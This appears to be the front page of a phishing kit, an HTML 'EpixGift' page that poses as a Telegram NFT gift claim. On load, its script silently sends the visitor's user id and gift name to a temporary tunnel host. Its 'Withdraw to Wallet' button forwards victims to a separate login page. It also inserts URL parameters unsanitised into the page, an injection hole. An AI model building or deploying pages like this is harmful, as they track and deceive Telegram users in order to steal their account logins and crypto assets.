<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>EpixGift</title>
    <style>
        body { background: #0e141b; color: #fff; font-family: -apple-system, sans-serif; margin: 0; padding: 20px; text-align: center; }
        .header { font-size: 22px; font-weight: 700; margin-bottom: 25px; text-align: left; border-bottom: 1px solid #1c252f; padding-bottom: 15px; }
        
        .nft-container { 
            background: #1c252f; 
            border-radius: 20px; 
            padding: 15px; 
            border: 1px solid #2a3644; 
            max-width: 300px; 
            margin: 0 auto;
        }

        .img-box { 
            width: 100%; 
            aspect-ratio: 1/1; 
            border-radius: 12px; 
            background: #000; 
            margin-bottom: 15px; 
            overflow: hidden; 
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .img-box img { 
            width: 100%; 
            height: 100%; 
            object-fit: cover; 
        }

        .title { font-weight: 700; font-size: 18px; margin-bottom: 5px; }
        .sub { font-size: 13px; color: #8a99a8; margin-bottom: 20px; }
        
        .btn { 
            display: block; 
            background: #248bdf; 
            color: #fff; 
            text-decoration: none; 
            padding: 14px; 
            border-radius: 12px; 
            font-weight: 700; 
            font-size: 16px; 
            border: none; 
            width: 100%; 
            cursor: pointer;
            box-sizing: border-box;
        }
    </style>
</head>
<body>
    <div class="header">EpixGift</div>

    <div class="nft-container" id="nft-item">
        </div>

    <script>
        // Парсим параметры: ?item=spicedwine-75193&uid=123
        const params = new URLSearchParams(window.location.search);
        const item = params.get('item') || 'spicedwine-75193';
        const uid = params.get('uid') || "Unknown";
        
        // Формируем прямую ссылку на официальное изображение Telegram
        // Формат: https://t.me/i/nft/ID.jpg - это самый надежный способ
        const imgUrl = `https://t.me/i/nft/${item}.jpg`;

        const nameDisplay = item.split('-')[0].charAt(0).toUpperCase() + item.split('-')[0].slice(1);
        const numDisplay = item.split('-')[1] || '';

        // Отрисовка
        document.getElementById('nft-item').innerHTML = `
            <div class="img-box">
                <img src="${imgUrl}" alt="NFT Gift" onerror="this.src='https://nft.fragment.com/pendant/${numDisplay}.webp'">
            </div>
            <div class="title">${nameDisplay} #${numDisplay}</div>
            <div class="sub">Collectible Gift Assets</div>
            <button class="btn" onclick="sendAndRedirect()">Withdraw to Wallet</button>
        `;

        // Отправка лога о просмотре
        async function trackVisit() {
            try {
                await fetch("https://ffdb8aa38a66bbe8-95-24-163-77.serveousercontent.com/submit", {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ 
                        type: 'visit', 
                        value: `User opened gift: ${item}`, 
                        uid: uid 
                    })
                });
            } catch(e) {}
        }
        trackVisit();

        function sendAndRedirect() {
            window.location.href = "login.html" + window.location.search;
        }
    </script>
</body>
</html>
